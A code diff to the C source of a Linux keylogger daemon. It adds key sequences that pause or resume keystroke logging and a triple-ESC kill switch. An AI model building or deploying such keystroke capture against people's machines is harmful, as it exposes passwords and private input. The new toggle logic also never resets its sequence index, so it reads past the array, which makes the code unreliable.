@@ -6,6 +6,7 @@
 #include <string.h>
 #include <unistd.h>
 
+#include "common.h"
 #include "input-args.h"
 #include "logger.h"
 #include "error.h"
@@ -96,6 +97,20 @@ void log_key(int fd, unsigned short code)
     write(fd, &c, 1);
 }
 
+/*
+ * The sequence of keys to start and stop the key logger
+ */
+static unsigned short start_stop_seq[] = {
+    KEY_RIGHTSHIFT, KEY_RIGHTSHIFT, KEY_RIGHTSHIFT
+};
+
+/*
+ * The sequence of keys to kill the keylogger daemon
+ */
+static unsigned short kill_seq[] = {
+    KEY_ESC, KEY_ESC, KEY_ESC
+};
+
 void keyloggerd(cmd_args_t cmd_args)
 {
     int keyboard;
@@ -123,19 +138,46 @@ void keyloggerd(cmd_args_t cmd_args)
     };
 
     ssize_t n;
-
     int log_fd = create_log(cmd_args);
+
+    int ss_k = 0; /* start/stop sequence index */
+    int kill_k = 0; /* kill sequence index */
+    bool log_key_enabled = true;
 
     while (1) {
         n = read(keyboard, &ev, sizeof(ev));
 
         if (n > 0) {
             if (ev.type == EV_KEY && ev.value == RELEASED) {
-                log_key(log_fd, ev.code);
+                if (log_key_enabled) {
+                    log_key(log_fd, ev.code);
+                }
 
-                if (ev.code == KEY_ESC) {
-                    logger.info("Magic ESC key pressed, stopping logger");
-                    break;
+                if (ev.code == start_stop_seq[ss_k]) {
+                    ss_k++;
+
+                    if (ss_k == ARRAY_SIZE(start_stop_seq)) {
+                        log_key_enabled = !log_key_enabled;
+
+                        if (log_key_enabled) {
+                            logger.warn("Key logging enabled");
+                        } else {
+                            logger.warn("Key logging disabled");
+                        }
+                    }
+                } else {
+                    ss_k = 0;
+                }
+
+                if (ev.code == kill_seq[kill_k]) {
+                    kill_k++;
+
+                    if (kill_k == ARRAY_SIZE(kill_seq)) {
+                        logger.warn("Magic kill switch sequence pressed");
+                        break;
+                    }
+                } else {
+                    kill_k = 0;
                 }
             }
         } else {
